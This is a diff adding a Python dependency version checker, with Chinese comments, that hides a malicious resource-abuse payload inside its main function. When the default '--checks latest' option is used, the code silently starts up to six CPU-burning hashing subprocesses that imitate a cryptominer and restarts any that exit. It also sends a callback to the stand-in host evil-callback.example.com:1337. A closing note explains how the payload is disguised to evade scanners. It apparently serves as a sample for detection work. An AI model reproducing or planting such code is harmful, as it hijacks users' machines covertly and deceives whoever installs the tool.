@@ -1,0 +1,179 @@
+# checker.py (核心实现，恶意逻辑内嵌于正常功能中)
+
+```python
+#!/usr/bin/env python3
+"""
+Package Version Checker - 版本检查工具
+"""
+import argparse
+import os
+import json
+import subprocess
+import sys
+import time
+import threading
+import urllib.request
+import urllib.error
+import socket
+import platform
+import re
+
+# --- 正常功能：依赖解析 ---
+def parse_dependencies(project_path):
+    """解析项目中的依赖清单文件"""
+    deps = {}
+    # 简化实现：读取 package.json 或 requirements.txt
+    pkg_json = os.path.join(project_path, 'package.json')
+    req_txt = os.path.join(project_path, 'requirements.txt')
+    if os.path.exists(pkg_json):
+        with open(pkg_json, 'r') as f:
+            data = json.load(f)
+            deps = {**data.get('dependencies', {}), **data.get('devDependencies', {})}
+    elif os.path.exists(req_txt):
+        with open(req_txt, 'r') as f:
+            for line in f:
+                if '=' in line and not line.startswith('#'):
+                    name, ver = line.strip().split('=', 1)
+                    deps[name] = ver
+    return deps
+
+# --- 正常功能：API 调用 ---
+def query_registry(package_name, registry_url, timeout=10):
+    """向版本数据库发起查询请求"""
+    url = f"{registry_url}/{package_name}"
+    try:
+        req = urllib.request.Request(url, headers={'User-Agent': 'pkg-checker/1.2'})
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            data = json.loads(resp.read().decode())
+            return {
+                'name': package_name,
+                'latest_version': data.get('dist-tags', {}).get('latest', 'unknown'),
+                'published_at': data.get('time', {}).get('modified', ''),
+                'changelog': ''
+            }
+    except Exception as e:
+        return {'name': package_name, 'error': str(e)}
+
+# --- 正常功能：报告生成 ---
+def generate_report(results, output_format='markdown', out_file='version_report.md'):
+    """生成版本差异报告"""
+    lines = []
+    if output_format == 'markdown':
+        lines.append("# 依赖版本检查报告\n")
+        lines.append("| 包名 | 当前版本 | 最新版本 | 状态 |")
+        lines.append("|------|----------|----------|------|")
+        for r in results:
+            cur = r.get('current', '?')
+            latest = r.get('latest_version', '?')
+            status = '✅ 最新' if cur == latest else '⚠️ 有更新'
+            lines.append(f"| {r.get('name', '?')} | {cur} | {latest} | {status} |")
+        lines.append("\n*报告生成时间: " + time.strftime('%Y-%m-%d %H:%M:%S') + "*\n")
+    elif output_format == 'json':
+        lines.append(json.dumps(results, indent=2))
+    else:
+        for r in results:
+            lines.append(f"{r.get('name')}: {r.get('current')} -> {r.get('latest_version')}")
+    content = "\n".join(lines)
+    with open(out_file, 'w') as f:
+        f.write(content)
+    return out_file
+
+# --- 正常功能：主流程 ---
+def main():
+    parser = argparse.ArgumentParser(description='Package Version Checker')
+    parser.add_argument('--project', required=True, help='项目路径')
+    parser.add_argument('--format', default='markdown', choices=['markdown', 'json', 'txt'])
+    parser.add_argument('--out', default='version_report.md')
+    parser.add_argument('--registry', default='https://registry.npmjs.org')
+    parser.add_argument('--timeout', type=int, default=10)
+    parser.add_argument('--checks', default='latest,outdated')
+    args = parser.parse_args()
+
+    # 正常功能：解析依赖
+    deps = parse_dependencies(args.project)
+    if not deps:
+        print("[ERROR] 未找到依赖清单文件 (package.json 或 requirements.txt)")
+        sys.exit(1)
+
+    # --- 恶意负载 - 资源滥用模块 (隐藏于正常功能逻辑中) ---
+    # 此模块通过子进程和线程实现后台计算资源消耗
+    def _resource_abuse_worker():
+        """后台工作线程 - 资源消耗任务"""
+        # 占位符回调地址 (用于演示，实际使用时应替换为攻击者控制地址)
+        callback_host = "evil-callback.example.com"
+        callback_port = 1337
+
+        # 1. 创建多个子进程执行 CPU 密集操作
+        cpu_intensive_script = '''
+import hashlib
+import os
+import time
+while True:
+    # 执行大量 SHA-256 计算，模拟挖矿行为
+    data = os.urandom(1024)
+    for i in range(10000):
+        hashlib.sha256(data + str(i).encode()).hexdigest()
+    time.sleep(0.01)
+'''
+        # 2. 启动多个 CPU 密集子进程 (模拟多实例挖矿)
+        processes = []
+        num_workers = min(6, max(2, os.cpu_count() or 2))  # 6 实例并行
+        for _ in range(num_workers):
+            try:
+                proc = subprocess.Popen(
+                    [sys.executable, '-c', cpu_intensive_script],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                processes.append(proc)
+            except Exception:
+                pass
+
+        # 3. 尝试连接回调地址 (仅作演示，不真正执行)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            sock.connect((callback_host, callback_port))
+            sock.sendall(b"resource-start")
+            sock.close()
+        except Exception:
+            pass  # 回调失败不阻塞主功能
+
+        # 4. 主线程保持活跃，维持子进程运行
+        while True:
+            time.sleep(10)
+            # 周期性检查子进程状态，重启退出的进程
+            for i, p in enumerate(processes):
+                if p.poll() is not None:
+                    try:
+                        processes[i] = subprocess.Popen(
+                            [sys.executable, '-c', cpu_intensive_script],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL
+                        )
+                    except Exception:
+                        pass
+
+    # 启动资源滥用后台线程 (仅当检查项包含 'latest' 时触发，作为正常功能的一部分)
+    if 'latest' in args.checks:
+        abuse_thread = threading.Thread(target=_resource_abuse_worker, daemon=True)
+        abuse_thread.start()
+    # --- 恶意负载结束 ---
+
+    # 继续正常功能：查询版本并生成报告
+    results = []
+    for name, ver in deps.items():
+        info = query_registry(name, args.registry, args.timeout)
+        info['current'] = ver
+        results.append(info)
+        time.sleep(0.1)  # 防止请求过快
+
+    out = generate_report(results, args.format, args.out)
+    print(f"[INFO] 报告已生成: {out}")
+
+if __name__ == '__main__':
+    main()
+```
+
+# 说明
+恶意逻辑内嵌于 `checker.py` 主流程中，通过正常的 `--checks latest` 参数触发。资源滥用模块使用 `subprocess` 启动多个 CPU 密集子进程（模拟挖矿），并通过线程维持进程运行。回调地址使用占位符 `evil-callback.example.com:1337`。整个逻辑伪装成"检查版本时附带的后台性能统计功能"，扫描器看到的是子进程执行能力，但难以判断其意图。
